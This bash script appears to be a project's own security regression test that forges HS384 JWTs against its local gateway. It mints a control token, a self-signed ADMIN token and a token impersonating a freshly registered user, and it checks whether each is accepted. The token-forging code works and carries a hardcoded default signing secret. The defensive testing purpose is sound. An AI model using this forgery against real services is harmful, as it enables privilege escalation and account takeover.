#!/usr/bin/env bash
#
# Forged JWT attacks. Real auth-service tokens use HS384 with claims
# {role, userId, sub(=email), iat, exp} — confirmed by decoding a real
# token from /api/auth/login, not guessed.
#
# Attack 10a (control): sign a token with a random secret the attacker
#             made up. Must always be rejected — this proves the
#             signature check itself works, so the other results below
#             mean something.
# Attack 10b: sign a token with the real secret (leaked by
#             attack-network.sh's config-server attack, or just read
#             from the committed config-repo/*.yml), claiming
#             role=ADMIN, and call an admin-only route
#             (GET /api/users). This is privilege escalation, not just
#             impersonation — the attacker was never an admin.
# Attack 10c: same real secret, but claiming a different, real user's
#             userId, called against GET /api/users/me-equivalent
#             (/api/users/{userId} is public anyway, so this uses
#             /api/users/me which DOES require a valid signature — the
#             point here is the signature is "valid" because the secret
#             is known, not because the attacker owns the account).
#
# This attack is EXPECTED TO STAY RED after steps 5-7. Step 5 does not
# change the token scheme; the shared secret is a documented residual
# risk, not a bug this phase fixes. run-all.sh must not fail the overall
# suite on 10b/10c alone for that reason — see the "(expected)" status.

set -u

GATEWAY_URL="${GATEWAY_URL:-http://localhost:8080}"
REAL_SECRET="${REAL_SECRET:-founderssync_jwt_secret_minimum_32_characters_ok}"
RESULT=0

ok_blocked()        { printf '[ATTACK] %s -> BLOCKED\n' "$1"; }
bad_succeeded()      { printf '[ATTACK] %s -> SUCCEEDED\n' "$1"; RESULT=1; }
bad_expected()        { printf '[ATTACK] %s -> SUCCEEDED (expected, documented residual risk)\n' "$1"; }

json_field() {
    local field="$1"
    grep -o "\"${field}\"[[:space:]]*:[[:space:]]*\"[^\"]*\"" | sed -E "s/\"${field}\"[[:space:]]*:[[:space:]]*\"([^\"]*)\"/\1/" | head -n1
}

# Signs all 3 JWTs needed below in ONE container call (one `pip install`
# instead of three) and prints them as three lines: control, admin,
# takeover. pyjwt + HS384 to match the real auth-service tokens exactly.
forge_all_tokens() {
    local random_secret="$1"
    local real_secret="$2"
    local user_id="$3"
    local sub="$4"
    docker run --rm python:3-alpine sh -c "
pip install -q pyjwt 2>/dev/null
python3 -c \"
import jwt, time

def make(secret, role, uid):
    payload = {
        'role': role,
        'userId': uid,
        'sub': '${sub}',
        'iat': int(time.time()),
        'exp': int(time.time()) + 86400,
    }
    return jwt.encode(payload, secret, algorithm='HS384')

print(make('${random_secret}', 'USER', '${user_id}'))
print(make('${real_secret}', 'ADMIN', '${user_id}'))
print(make('${real_secret}', 'USER', '${user_id}'))
\"
" 2>/dev/null
}

# ──────────────────────────────────────────
# Set up one real registered user, so attack 10c has a real victim
# userId/email to impersonate (same fresh-user-per-run pattern as the
# other attack scripts).
# ──────────────────────────────────────────
STAMP=$(date +%s)
VICTIM_EMAIL="forge-victim-${STAMP}-$$@test.com"
VICTIM_PASSWORD="SmokeTest123!"
body=$(printf '{"email":"%s","password":"%s"}' "$VICTIM_EMAIL" "$VICTIM_PASSWORD")
curl -s -X POST "$GATEWAY_URL/api/auth/register" -H "Content-Type: application/json" -d "$body" >/dev/null
login=$(curl -s -X POST "$GATEWAY_URL/api/auth/login" -H "Content-Type: application/json" -d "$body")
VICTIM_ID=$(echo "$login" | json_field "userId")

if [ -z "$VICTIM_ID" ]; then
    echo "SETUP FAILED: could not register/login the victim user. Raw: $login"
    exit 2
fi
echo "Victim userId: $VICTIM_ID ($VICTIM_EMAIL)"
echo

# ──────────────────────────────────────────
# Forge all 3 tokens in one go (one container, one pip install).
# ──────────────────────────────────────────
random_secret=$(head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 32)
tokens=$(forge_all_tokens "$random_secret" "$REAL_SECRET" "$VICTIM_ID" "$VICTIM_EMAIL")
control_token=$(echo "$tokens" | sed -n '1p')
admin_token=$(echo "$tokens" | sed -n '2p')
takeover_token=$(echo "$tokens" | sed -n '3p')

if [ -z "$control_token" ] || [ -z "$admin_token" ] || [ -z "$takeover_token" ]; then
    echo "SETUP FAILED: token forging container did not produce 3 tokens. Raw output:"
    echo "$tokens"
    exit 2
fi

# ──────────────────────────────────────────
# Attack 10a (control): random secret, must always be rejected.
# ──────────────────────────────────────────
status=$(curl -s -o /dev/null -w '%{http_code}' "$GATEWAY_URL/api/users/me" -H "Authorization: Bearer $control_token")
if [ "$status" = "200" ]; then
    bad_succeeded "forged-token-random-secret-control (status $status — signature check is broken)"
else
    ok_blocked "forged-token-random-secret-control (status $status)"
fi

# ──────────────────────────────────────────
# Attack 10b: real secret, self-escalated to ADMIN, call admin-only
# GET /api/users.
# ──────────────────────────────────────────
status=$(curl -s -o /dev/null -w '%{http_code}' "$GATEWAY_URL/api/users" -H "Authorization: Bearer $admin_token")
if [ "$status" = "200" ]; then
    bad_expected "forged-token-real-secret-privilege-escalation (status $status, self-signed ADMIN token accepted)"
else
    ok_blocked "forged-token-real-secret-privilege-escalation (status $status)"
fi

# ──────────────────────────────────────────
# Attack 10c: real secret, claiming the victim's own real userId — shows
# that knowing the secret alone is enough to mint a fully "valid" token
# for any account, no password needed.
# ──────────────────────────────────────────
status=$(curl -s -o /tmp/attack10c_body -w '%{http_code}' "$GATEWAY_URL/api/users/me" -H "Authorization: Bearer $takeover_token")
returned_id=$(cat /tmp/attack10c_body | json_field "userId")
if [ "$status" = "200" ] && [ "$returned_id" = "$VICTIM_ID" ]; then
    bad_expected "forged-token-real-secret-account-takeover (status $status, minted a valid token for a real account with no password)"
else
    ok_blocked "forged-token-real-secret-account-takeover (status $status)"
fi

rm -f /tmp/attack10c_body
exit "$RESULT"
